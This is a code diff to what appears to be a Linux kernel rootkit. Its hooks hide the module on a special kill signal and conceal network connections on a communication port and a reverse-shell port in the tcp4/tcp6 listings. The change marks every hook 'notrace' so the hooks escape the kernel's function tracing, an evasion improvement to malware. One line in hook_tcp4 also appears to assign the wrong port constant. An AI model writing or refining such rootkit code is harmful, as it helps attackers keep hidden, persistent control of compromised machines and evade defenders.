@@ -66,7 +66,7 @@ static inline void show_module(void) {
 }
 
 #if PTREGS_SYSCALL_STUB
-static asmlinkage long hook_kill(const struct pt_regs *regs) {
+static notrace asmlinkage long hook_kill(const struct pt_regs *regs) {
   int sig = regs->si;
 
   switch (sig) {
@@ -86,7 +86,7 @@ static asmlinkage long hook_kill(const struct pt_regs *regs) {
 }
 #else
 
-static asmlinkage long hook_kill(pid_t pid, int sig) {
+static notrace asmlinkage long hook_kill(pid_t pid, int sig) {
   switch (sig) {
   case SIGINVIS:
     if (hidden)
@@ -104,7 +104,7 @@ static asmlinkage long hook_kill(pid_t pid, int sig) {
 }
 #endif
 
-static asmlinkage long hook_tcp6(struct seq_file *seq, void *v) {
+static notrace asmlinkage long hook_tcp6(struct seq_file *seq, void *v) {
   struct inet_sock *sock;
   unsigned short communication_port = htons(COMM_PORT);
 
@@ -118,7 +118,7 @@ static asmlinkage long hook_tcp6(struct seq_file *seq, void *v) {
   return orig_tcp6_seq_show(seq, v);
 }
 
-static asmlinkage long hook_tcp4(struct seq_file *seq, void *v) {
+static notrace asmlinkage long hook_tcp4(struct seq_file *seq, void *v) {
   struct inet_sock *sock;
   unsigned short communication_port = htons(REV_SHELL_PORT);
   unsigned short revshell_port = htons(REV_SHELL_PORT);
